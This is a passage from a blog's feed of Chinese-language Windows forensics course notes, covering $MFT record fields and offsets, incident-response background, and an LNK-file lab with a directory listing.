 &lt;a class="anchor" href="#lab---resident-file">#&lt;/a>
&lt;/h2>
&lt;h3 id="lab---offset-43208704d">
 Lab - Offset 43208704(d)
 &lt;a class="anchor" href="#lab---offset-43208704d">#&lt;/a>
&lt;/h3>
&lt;p>先找檔名，後面會跟著&lt;code>18 00 00 00 01 00&lt;/code>，前面會有non-resident flag(前面第二個byte)，再後面會跟著檔案大小&lt;code>D0 01&lt;/code>，再後面一點會跟著原本這個file的signature&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - $MFT 基本實作</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-%E5%9F%BA%E6%9C%AC%E5%AF%A6%E4%BD%9C/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-%E5%9F%BA%E6%9C%AC%E5%AF%A6%E4%BD%9C/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---mft-基本實作">
 TaiwanHolyHigh - Windows Forensics - $MFT 基本實作
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---mft-%e5%9f%ba%e6%9c%ac%e5%af%a6%e4%bd%9c">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::
:::info
以下引用若無特別說明皆來自於講師的上課簡報
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>$MFT儲存的內容
&lt;ol>
&lt;li>==Status==: SO=22, LE=2，也就是目前此檔案的狀態，分為以下四種
&lt;ul>
&lt;li>&lt;code>0000&lt;/code>: Delete File&lt;/li>
&lt;li>&lt;code>0100&lt;/code>: File&lt;/li>
&lt;li>&lt;code>0200&lt;/code>: Delete Folder&lt;/li>
&lt;li>&lt;code>0300&lt;/code>: Folder&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==$MFT Record==(File Identify/Location): SO=44, LE=4，也就是此檔案在record在$MFT的位置在哪邊&lt;/li>
&lt;li>==Timestamp==
&lt;ul>
&lt;li>Standard Info: SO=80, LE=32(Creat+Modified+$MFT Modified+Access)，很容易就可以更改，如果要更改，可以參考&lt;a href="https://newfiletime.en.softonic.com/?ex=RAMP-1462.1">New Filetime&lt;/a>這個工具&lt;/li>
&lt;li>Filename: SO=184, LE=32(Creat+Modified+$MFT Modified+Access)
很難被更改(但還是可以更改)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==Resident / non-Resident File==
下一篇詳細說明&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;p>:::info
以下三個練習都是Resident File
:::&lt;/p>
&lt;h2 id="lab---offset-43110400d">
 Lab - Offset 43110400(d)
 &lt;a class="anchor" href="#lab---offset-43110400d">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>$MFT長度一段就是1024 Bytes，我把結束的位址減掉開頭的位置就知道了，或是可以直接用HxD底下看長度(0x400)
&lt;img src="https://hackmd.io/_uploads/rk0s7QKza.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/rJjnQ7tfT.png" alt="" />
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x291D400&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x291D000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1024&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>從上圖也可以看到magical word就是&lt;code>FILE0&lt;/code>$\to$&lt;code>46 49 4C 45 30&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="overview從上到下">
 Overview(從上到下)
 &lt;a class="anchor" href="#overview%e5%be%9e%e4%b8%8a%e5%88%b0%e4%b8%8b">#&lt;/a>
&lt;/h3>
&lt;p>&lt;img src="https://hackmd.io/_uploads/S1l-DgEtzp.png" alt="" />&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - Background</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---background/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---background/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---background">
 TaiwanHolyHigh - Windows Forensics - Background
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---background">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h3 id="資安事件的流程">
 ==資安事件的流程==
 &lt;a class="anchor" href="#%e8%b3%87%e5%ae%89%e4%ba%8b%e4%bb%b6%e7%9a%84%e6%b5%81%e7%a8%8b">#&lt;/a>
&lt;/h3>
&lt;p>&lt;img src="https://hackmd.io/_uploads/BkbVWYmz6.png" alt="" />&lt;/p>
&lt;ul>
&lt;li>Prepare
&lt;ul>
&lt;li>建立Infra&lt;/li>
&lt;li>購買ISO(e.g. &lt;a href="https://www.tsg.com.tw/blog-detail10-248-0-iso27001.htm">ISO 27001&lt;/a>)&lt;/li>
&lt;li>SPA(&lt;a href="https://www.issdu.com.tw/service/9-shc">資安健診&lt;/a>)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Predict
&lt;ul>
&lt;li>&lt;a href="https://www.informationsecurity.com.tw/article/article_detail.aspx?aid=8376">Threat Intelligence(威脅情資)&lt;/a>&lt;/li>
&lt;li>Recon(情蒐)&lt;/li>
&lt;li>Monitor(監控)&lt;/li>
&lt;li>搜尋Pattern&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Identify(識別): 有興趣可以看這一篇論文筆記&lt;a href="https://hackmd.io/@SBK6401/BJuCGSnAo">DeepCase&lt;/a>
&lt;ul>
&lt;li>&lt;a href="https://www.freedom.net.tw/ict-insight/security/siem-vs-soc.html">SOC(資安監控中心)&lt;/a>
&lt;blockquote>
&lt;p>&lt;img src="https://www.freedom.net.tw/images/article/caption/siem%20vs%20soc.jpg" alt="" />&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>IDS: 入侵偵測系統（Intrusion Detection System，IDS）是用來偵測資訊系統或網路上潛在的惡意破壞活動&lt;/li>
&lt;li>IPS: &lt;a href="https://www.ithome.com.tw/tech/28712">IThelp - Active Defense&lt;/a>&lt;/li>
&lt;li>Audit: AD常常遇到&lt;/li>
&lt;li>EDR&lt;/li>
&lt;li>Code Review&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Prevent: 防禦攻擊
&lt;ul>
&lt;li>Firewall(Layer 4 - Transport)&lt;/li>
&lt;li>&lt;a href="https://www.oracle.com/tw/security/cloud-security/what-is-waf/">WAF(Layer 7 - Application)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.mikotek.com.tw/dlp/">DLP(資料外洩防護)&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Incident Profile: 這個項目比較能夠得到一些惡意的行為，而該行為一定脫離不了下面三點
&lt;ol>
&lt;li>Purpose/Payload(有可能是Data, Source, 或金錢等等)&lt;/li>
&lt;li>Path(透過甚麼途徑達成目的，有可能是USB, 社交工程, 0-day)&lt;/li>
&lt;li>Behavior(建立帳戶/開service/與C&amp;amp;C連線等等)&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>Incident Response
&lt;ul>
&lt;li>Restore(主動)&lt;/li>
&lt;li>Recovery(被動)&lt;/li>
&lt;li>Isolate&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Deter: 主動式的阻絕
&lt;ul>
&lt;li>Inside&lt;/li>
&lt;li>Outside(就是找外援通常是執法單位)
&lt;ul>
&lt;li>law enforcement(執法單位)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Forensics Triage: 做分流的動作
&lt;ul>
&lt;li>揮發性資料(RAM&amp;hellip;)&lt;/li>
&lt;li>Network&lt;/li>
&lt;li>Process&lt;/li>
&lt;li>System&lt;/li>
&lt;li>Artifacts(registry/log/temp&amp;hellip;)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Duplicate(Image): 製作證據的映像檔$\to$非揮發性的資料
&lt;ul>
&lt;li>RAW Image&lt;/li>
&lt;li>Evidence File&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Forensics Analysis
&lt;ul>
&lt;li>已知項目(Known)
&lt;ul>
&lt;li>Keyword&lt;/li>
&lt;li>Hash&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Baseline
&lt;ul>
&lt;li>Recovery&lt;/li>
&lt;li>Signature&lt;/li>
&lt;li>Sorting&lt;/li>
&lt;li>Artifact
&lt;ul>
&lt;li>LNK&lt;/li>
&lt;li>Prefetch&lt;/li>
&lt;li>SPL&lt;/li>
&lt;li>Thumbnail&lt;/li>
&lt;li>Registry(非揮發性)&lt;/li>
&lt;li>Log&lt;/li>
&lt;li>Recycle Bin&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="網路攻擊鍊cyber-kill-chain">
 ==網路攻擊鍊(Cyber Kill Chain)==
 &lt;a class="anchor" href="#%e7%b6%b2%e8%b7%af%e6%94%bb%e6%93%8a%e9%8d%8acyber-kill-chain">#&lt;/a>
&lt;/h3>
&lt;p>詳細資料: &lt;a href="https://teamt5.org/tw/posts/what-is-cyber-kill-chain/">TeamT5 - Cyber Kill Chain&lt;/a>&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - LNK Lab</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---lnk-lab/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---lnk-lab/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---lnk-lab">
 TaiwanHolyHigh - Windows Forensics - LNK Lab
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---lnk-lab">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>:::info
以下引用若無特別說明皆來自於講師的上課簡報
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>What is .LNK?
&lt;blockquote>
&lt;p>LNK 檔為 Windows 系統中，執行程式或開啟檔案後會留存的捷徑檔，該檔案內會有相當多的資訊&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>Where is .LNK?
&lt;blockquote>
&lt;p>預設 LNK 檔案會放在使用者目錄下，可透過以下指令檢視：&lt;code>$ dir c:\Users\{username}\*.lnk /b /s&lt;/code>
:::spoiler 執行結果&lt;/p>&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ dir c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\*&lt;/span>.lnk /b /s
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup1&lt;span style="color:#ae81ff">\1&lt;/span> - Desktop.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup2&lt;span style="color:#ae81ff">\1&lt;/span> - Run.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup2&lt;span style="color:#ae81ff">\2&lt;/span> - Search.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup2&lt;span style="color:#ae81ff">\3&lt;/span> - Windows Explorer.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup2&lt;span style="color:#ae81ff">\4&lt;/span> - Control Panel.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup2&lt;span style="color:#ae81ff">\5&lt;/span> - Task Manager.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>1a - Windows PowerShell.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>2a - Windows PowerShell.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span> - Computer Management.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span> - Disk Management.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>4-1 - NetworkStatus.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span> - Device Manager.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span> - SystemAbout.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span> - Event Viewer.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span> - PowerAndSleep.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span> - Mobility Center.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\1&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> - AppsAndFeatures.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\C&lt;/span>hromium.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\F&lt;/span>ile Shredder.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\G&lt;/span>oogle Chrome.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft Edge.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\O&lt;/span>racle VM VirtualBox.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\S&lt;/span>hows Desktop.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\W&lt;/span>indow Switcher.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\A&lt;/span>nyDesk.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\D&lt;/span>iscord.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\E&lt;/span>xcel.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\F&lt;/span>ile Explorer.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\F&lt;/span>irefox.lnk
